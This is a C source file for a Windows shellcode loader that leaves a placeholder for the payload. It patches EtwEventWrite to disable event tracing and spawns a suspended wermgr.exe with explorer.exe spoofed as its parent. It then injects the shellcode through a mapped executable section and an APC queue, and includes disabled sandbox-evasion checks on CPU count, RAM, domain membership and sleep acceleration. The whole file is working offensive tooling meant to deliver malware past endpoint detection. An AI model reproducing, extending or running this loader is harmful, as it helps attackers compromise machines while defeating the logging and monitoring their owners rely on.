#include <Windows.h>
#include "allcalls.h"
#include "LM.h"
#include <TlHelp32.h>
#pragma comment(lib, "netapi32.lib")

unsigned char shellcode[] = "SHELLCODE HERE";  // Input 1

size_t shellcode_len = sizeof(shellcode);
char key[] = "ac"; // Input 2 (XOR Key)

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

void processors() {

	// Check if <X processors
	int minprocs = 2;
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numprocs = sysinfo.dwNumberOfProcessors;
	if (numprocs < minprocs) {
		exit(0);
	}
}

void domainJoined() {

	// Check if domain joined
	PWSTR domainName;
	NETSETUP_JOIN_STATUS status;
	NetGetJoinInformation(NULL, &domainName, &status);
	if (status != NetSetupDomainName) {
		exit(0);
	}
}

void ram() {

	// Check if <X RAM
	MEMORYSTATUSEX totram;
	totram.dwLength = sizeof(totram);
	GlobalMemoryStatusEx(&totram);
	if ((float)totram.ullTotalPhys / 1073741824 < 4) {
		exit(0);
	}
}

void skipSleep() {

	// Check if long sleeps fast forwarded
	ULONGLONG uptimebeforesleep = GetTickCount64();
	LARGE_INTEGER Interval;
	Interval.QuadPart = -900000000;
	NtDelayExecution(FALSE, &Interval);
	ULONGLONG uptimeaftersleep = GetTickCount64();

	// If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
	if (uptimeaftersleep - uptimebeforesleep < 75000) {
		exit(0);
	};
}

void patchETW() {

	HANDLE curproc = GetCurrentProcess();
	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

	// Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

	DWORD oldprotect;
	LPVOID lpBaseAddress = EEWAddress;
	ULONG NewProtection;

	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
	NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

}

void patchETWRemote(HANDLE remoteProc) {

	HANDLE targetProcHandle = remoteProc;

	DWORD oldprotect1;
	ULONG NewProtection1;

	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
	LPVOID lpBaseAddress = EEWAddress;

	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
	NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}

HANDLE getHandle(int processID) {

	HANDLE targetProcHandle;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)processID;
	cid.UniqueThread = 0;

	NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

	return targetProcHandle;

}

DWORD GetPidByName(const char* pName) {
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) {
		while (Process32Next(snapshot, &pEntry) == TRUE) {
			if (_stricmp(pEntry.szExeFile, pName) == 0) {
				return pEntry.th32ProcessID;
			}
		}
	}
	NtClose(snapshot);
	return 0;
}

void run() {

	STARTUPINFOEXA info;
	PROCESS_INFORMATION processInfo;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = 0;
	ZeroMemory(&info, sizeof(STARTUPINFOEXA));


	dwPid = GetPidByName("explorer.exe"); // PARENT HERE
	if (dwPid == 0)
		dwPid = GetCurrentProcessId(); // If fails use current process as parent

	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

	hParentProcess = getHandle(dwPid);

	UpdateProcThreadAttribute(pAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParentProcess,
		sizeof(HANDLE),
		NULL,
		NULL);

	info.lpAttributeList = pAttributeList;

	CreateProcessA(NULL,
		(LPSTR)"wermgr.exe", // Spawn process here
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&info.StartupInfo,
		&processInfo);

	DeleteProcThreadAttributeList(pAttributeList);
	NtClose(hParentProcess);

	patchETWRemote(processInfo.hProcess); // Patch ETW Remote

	SIZE_T size = shellcode_len;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;
	HANDLE curproc = GetCurrentProcess();

	NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	NtMapViewOfSection(sectionHandle, curproc, &localSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_READWRITE);
	NtMapViewOfSection(sectionHandle, processInfo.hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_EXECUTE_READ);

	//XOR((char*)shellcode, shellcode_len, key, sizeof(key));

	SIZE_T byteswritten = 0;
	NtWriteVirtualMemory(curproc, localSectionAddress, shellcode, shellcode_len, &byteswritten);
	NtQueueApcThread(processInfo.hThread, (PKNORMAL_ROUTINE)remoteSectionAddress, NULL, NULL, NULL);
	NtResumeThread(processInfo.hThread, NULL);

}

// --- MAIN ---
void main() {


	patchETW();
	//processors();
	//domainJoined();
	//ram();
	//skipSleep();
	run();

}
